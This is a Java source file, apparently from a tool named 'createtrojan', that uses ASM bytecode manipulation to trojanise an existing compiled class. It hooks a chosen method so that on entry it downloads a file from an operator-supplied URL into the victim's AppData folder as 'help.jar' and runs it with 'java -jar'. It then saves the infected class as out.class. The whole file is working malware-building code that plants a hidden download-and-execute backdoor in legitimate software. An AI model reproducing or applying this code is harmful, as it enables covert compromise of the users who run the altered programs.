package me.server.createtrojan;

import jdk.internal.org.objectweb.asm.*;
import jdk.internal.org.objectweb.asm.commons.AdviceAdapter;

import javax.swing.*;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;

import static org.objectweb.asm.ClassWriter.COMPUTE_FRAMES;
import static org.objectweb.asm.Opcodes.*;
import static org.objectweb.asm.Opcodes.RETURN;

public class Inject {
    public static void inject(String classpath,String methodName,String descName,String downloadURL) {
        try {
            InputStream inputStream = new FileInputStream(classpath);
            ClassReader reader = new ClassReader(inputStream);
            ClassWriter writer = new ClassWriter(reader, 0);
            ClassVisitor change = new ChangeVisitor(writer,methodName,downloadURL,reader.getClassName(),descName);
            reader.accept(change, ClassReader.EXPAND_FRAMES);
            byte[] code = writer.toByteArray();
            try {
                FileOutputStream fos = new FileOutputStream(System.getProperty("user.dir") + "\\out.class");
                fos.write(code);
                fos.close();
                inputStream.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
            JOptionPane.showMessageDialog(null,"out.class已保存在当前目录","生成成功",JOptionPane.INFORMATION_MESSAGE);
        } catch (Exception e) {
        }
    }
    static class ChangeVisitor extends ClassVisitor {
        String methodName;
        String descName;
        String downloadURL;
        String className;
        ChangeVisitor(ClassVisitor classVisitor,String methodName,String downloadURL,String className,String descName) {
            super(ASM4, classVisitor);
            this.methodName = methodName;
            this.downloadURL = downloadURL;
            this.className = className;
            this.descName = descName;
        }
        @Override
        public MethodVisitor visitMethod(int access, String name, String desc, String signature, String[] exceptions) {
            MethodVisitor methodVisitor = super.visitMethod(access, name, desc, signature, exceptions);
            if(name.equals(methodName) && desc.equals(descName)) {
                return new MyAdviceAdapter(ASM4,methodVisitor,access,name,desc,downloadURL,className);
            }
            return methodVisitor;
        }
        @Override
        public void visitEnd() {
            MethodVisitor methodVisitor = cv.visitMethod(ACC_PUBLIC | ACC_STATIC, "$urlDownload", "(Ljava/lang/String;)V", null, null);
            methodVisitor.visitCode();
            Label label0 = new Label();
            Label label1 = new Label();
            Label label2 = new Label();
            methodVisitor.visitTryCatchBlock(label0, label1, label2, "java/lang/Exception");
            methodVisitor.visitLabel(label0);
            methodVisitor.visitLineNumber(11, label0);
            methodVisitor.visitTypeInsn(NEW, "java/net/URL");
            methodVisitor.visitInsn(DUP);
            methodVisitor.visitVarInsn(ALOAD, 0);
            methodVisitor.visitMethodInsn(INVOKESPECIAL, "java/net/URL", "<init>", "(Ljava/lang/String;)V", false);
            methodVisitor.visitVarInsn(ASTORE, 1);
            Label label3 = new Label();
            methodVisitor.visitLabel(label3);
            methodVisitor.visitLineNumber(12, label3);
            methodVisitor.visitVarInsn(ALOAD, 1);
            methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/net/URL", "openStream", "()Ljava/io/InputStream;", false);
            methodVisitor.visitVarInsn(ASTORE, 2);
            Label label4 = new Label();
            methodVisitor.visitLabel(label4);
            methodVisitor.visitLineNumber(13, label4);
            methodVisitor.visitTypeInsn(NEW, "java/io/FileOutputStream");
            methodVisitor.visitInsn(DUP);
            methodVisitor.visitTypeInsn(NEW, "java/lang/StringBuilder");
            methodVisitor.visitInsn(DUP);
            methodVisitor.visitMethodInsn(INVOKESPECIAL, "java/lang/StringBuilder", "<init>", "()V", false);
            methodVisitor.visitLdcInsn("user.home");
            methodVisitor.visitMethodInsn(INVOKESTATIC, "java/lang/System", "getProperty", "(Ljava/lang/String;)Ljava/lang/String;", false);
            methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
            methodVisitor.visitLdcInsn("\\AppData\\help.jar");
            methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
            methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/StringBuilder", "toString", "()Ljava/lang/String;", false);
            methodVisitor.visitMethodInsn(INVOKESPECIAL, "java/io/FileOutputStream", "<init>", "(Ljava/lang/String;)V", false);
            methodVisitor.visitVarInsn(ASTORE, 3);
            Label label5 = new Label();
            methodVisitor.visitLabel(label5);
            methodVisitor.visitLineNumber(14, label5);
            methodVisitor.visitInsn(ICONST_0);
            methodVisitor.visitVarInsn(ISTORE, 4);
            Label label6 = new Label();
            methodVisitor.visitLabel(label6);
            methodVisitor.visitLineNumber(15, label6);
            methodVisitor.visitIntInsn(SIPUSH, 1024);
            methodVisitor.visitIntInsn(NEWARRAY, T_BYTE);
            methodVisitor.visitVarInsn(ASTORE, 5);
            Label label7 = new Label();
            methodVisitor.visitLabel(label7);
            methodVisitor.visitLineNumber(16, label7);
            methodVisitor.visitFrame(Opcodes.F_FULL, 6, new Object[]{"java/lang/String", "java/net/URL", "java/io/InputStream", "java/io/FileOutputStream", Opcodes.INTEGER, "[B"}, 0, new Object[]{});
            methodVisitor.visitVarInsn(ALOAD, 2);
            methodVisitor.visitVarInsn(ALOAD, 5);
            methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/io/InputStream", "read", "([B)I", false);
            methodVisitor.visitInsn(DUP);
            methodVisitor.visitVarInsn(ISTORE, 4);
            methodVisitor.visitInsn(ICONST_M1);
            Label label8 = new Label();
            methodVisitor.visitJumpInsn(IF_ICMPEQ, label8);
            Label label9 = new Label();
            methodVisitor.visitLabel(label9);
            methodVisitor.visitLineNumber(17, label9);
            methodVisitor.visitVarInsn(ALOAD, 3);
            methodVisitor.visitVarInsn(ALOAD, 5);
            methodVisitor.visitInsn(ICONST_0);
            methodVisitor.visitVarInsn(ILOAD, 4);
            methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/io/FileOutputStream", "write", "([BII)V", false);
            methodVisitor.visitJumpInsn(GOTO, label7);
            methodVisitor.visitLabel(label8);
            methodVisitor.visitLineNumber(19, label8);
            methodVisitor.visitFrame(Opcodes.F_SAME, 0, null, 0, null);
            methodVisitor.visitVarInsn(ALOAD, 2);
            methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/io/InputStream", "close", "()V", false);
            Label label10 = new Label();
            methodVisitor.visitLabel(label10);
            methodVisitor.visitLineNumber(20, label10);
            methodVisitor.visitVarInsn(ALOAD, 3);
            methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/io/FileOutputStream", "close", "()V", false);
            Label label11 = new Label();
            methodVisitor.visitLabel(label11);
            methodVisitor.visitLineNumber(21, label11);
            methodVisitor.visitMethodInsn(INVOKESTATIC, "java/lang/Runtime", "getRuntime", "()Ljava/lang/Runtime;", false);
            methodVisitor.visitTypeInsn(NEW, "java/lang/StringBuilder");
            methodVisitor.visitInsn(DUP);
            methodVisitor.visitMethodInsn(INVOKESPECIAL, "java/lang/StringBuilder", "<init>", "()V", false);
            methodVisitor.visitLdcInsn("java -jar ");
            methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
            methodVisitor.visitLdcInsn("user.home");
            methodVisitor.visitMethodInsn(INVOKESTATIC, "java/lang/System", "getProperty", "(Ljava/lang/String;)Ljava/lang/String;", false);
            methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
            methodVisitor.visitLdcInsn("\\AppData\\help.jar");
            methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
            methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/StringBuilder", "toString", "()Ljava/lang/String;", false);
            methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Runtime", "exec", "(Ljava/lang/String;)Ljava/lang/Process;", false);
            methodVisitor.visitInsn(POP);
            methodVisitor.visitLabel(label1);
            methodVisitor.visitLineNumber(23, label1);
            Label label12 = new Label();
            methodVisitor.visitJumpInsn(GOTO, label12);
            methodVisitor.visitLabel(label2);
            methodVisitor.visitLineNumber(22, label2);
            methodVisitor.visitFrame(Opcodes.F_FULL, 1, new Object[]{"java/lang/String"}, 1, new Object[]{"java/lang/Exception"});
            methodVisitor.visitVarInsn(ASTORE, 1);
            methodVisitor.visitLabel(label12);
            methodVisitor.visitLineNumber(24, label12);
            methodVisitor.visitFrame(Opcodes.F_SAME, 0, null, 0, null);
            methodVisitor.visitInsn(RETURN);
            Label label13 = new Label();
            methodVisitor.visitLabel(label13);
            methodVisitor.visitLocalVariable("url", "Ljava/net/URL;", null, label3, label1, 1);
            methodVisitor.visitLocalVariable("inputStream", "Ljava/io/InputStream;", null, label4, label1, 2);
            methodVisitor.visitLocalVariable("fileOutputStream", "Ljava/io/FileOutputStream;", null, label5, label1, 3);
            methodVisitor.visitLocalVariable("len", "I", null, label6, label1, 4);
            methodVisitor.visitLocalVariable("bytes", "[B", null, label7, label1, 5);
            methodVisitor.visitLocalVariable("str", "Ljava/lang/String;", null, label0, label13, 0);
            methodVisitor.visitMaxs(4, 6);
            methodVisitor.visitEnd();
            super.visitEnd();
        }
    }
    static class MyAdviceAdapter extends AdviceAdapter{
        String downloadURL;
        String className;
        protected MyAdviceAdapter(int api, MethodVisitor mv, int access, String name, String desc,String downloadURL,String className) {
            super(api, mv, access, name, desc);
            this.downloadURL = downloadURL;
            this.className = className;
        }
        @Override
        protected void onMethodEnter() {
            super.onMethodEnter();
            mv.visitLdcInsn(downloadURL);
            mv.visitMethodInsn(INVOKESTATIC,className,"$urlDownload","(Ljava/lang/String;)V",false);
        }
    }
}